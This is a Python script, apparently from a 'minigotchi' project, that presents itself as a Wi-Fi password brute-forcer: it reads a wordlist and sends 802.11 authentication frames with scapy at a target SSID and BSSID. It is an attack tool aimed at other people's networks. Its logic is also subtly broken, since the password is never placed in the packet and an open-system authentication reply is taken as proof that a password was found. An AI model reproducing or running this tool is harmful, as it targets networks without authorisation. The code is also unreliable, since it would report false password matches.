# File: minigotchi/password_brute.py
import argparse
import logging
import sys
import time

from typing import Generator
from scapy.all import Dot11, Dot11Auth, RadioTap, sendp, sniff


def generate_passwords(wordlist: str) -> Generator[str, None, None]:
    """
    Yield passwords from the specified wordlist file.
    """
    try:
        with open(wordlist, 'r', encoding='utf-8') as f:
            for line in f:
                yield line.strip()
    except FileNotFoundError:
        logging.critical("Wordlist file not found: %s", wordlist)
        sys.exit(1)


def attempt_auth(interface: str, ssid: str, bssid: str, password: str) -> bool:
    """
    Send an authentication packet with given password and return True if success detected in response.
    """
    pkt = (
        RadioTap()/
        Dot11(type=0, subtype=11, addr1=bssid, addr2="00:00:00:00:00:00", addr3=bssid)/
        Dot11Auth(algo=0, seqnum=1, status=0)
    )
    sendp(pkt, iface=interface, count=1, inter=0.5, verbose=False)
    # Sniff for auth response
    pkts = sniff(iface=interface, timeout=2, count=1,
                 lfilter=lambda p: p.haslayer(Dot11Auth))
    for resp in pkts:
        if resp.getlayer(Dot11Auth).status == 0:
            return True
    return False


def brute_force(
    interface: str,
    ssid: str,
    bssid: str,
    wordlist: str,
    delay: float = 1.0
) -> None:
    """
    Attempt to brute-force authentication using the provided wordlist.
    """
    logging.info("Starting brute-force against %s (%s)", ssid, bssid)
    for pwd in generate_passwords(wordlist):
        logging.debug("Trying password: %s", pwd)
        try:
            success = attempt_auth(interface, ssid, bssid, pwd)
        except Exception as e:
            logging.error("Error during auth attempt with %s: %s", pwd, e)
            continue

        if success:
            logging.info("Password found: %s", pwd)
            return
        time.sleep(delay)

    logging.warning("Brute-force complete; no valid password found.")


def main():
    parser = argparse.ArgumentParser(description="Password Brute-Force for Minigotchi")
    parser.add_argument("-i", "--interface", default="wlan0", help="Wireless interface to use")
    parser.add_argument("-s", "--ssid", required=True, help="Target network SSID")
    parser.add_argument("-b", "--bssid", required=True, help="Target network BSSID (MAC)")
    parser.add_argument(
        "-w", "--wordlist", required=True, help="Path to password wordlist file"
    )
    parser.add_argument(
        "-d", "--delay", type=float, default=1.0, help="Delay between attempts in seconds"
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Enable debug logging"
    )
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    brute_force(
        interface=args.interface,
        ssid=args.ssid,
        bssid=args.bssid,
        wordlist=args.wordlist,
        delay=args.delay,
    )


if __name__ == "__main__":
    main()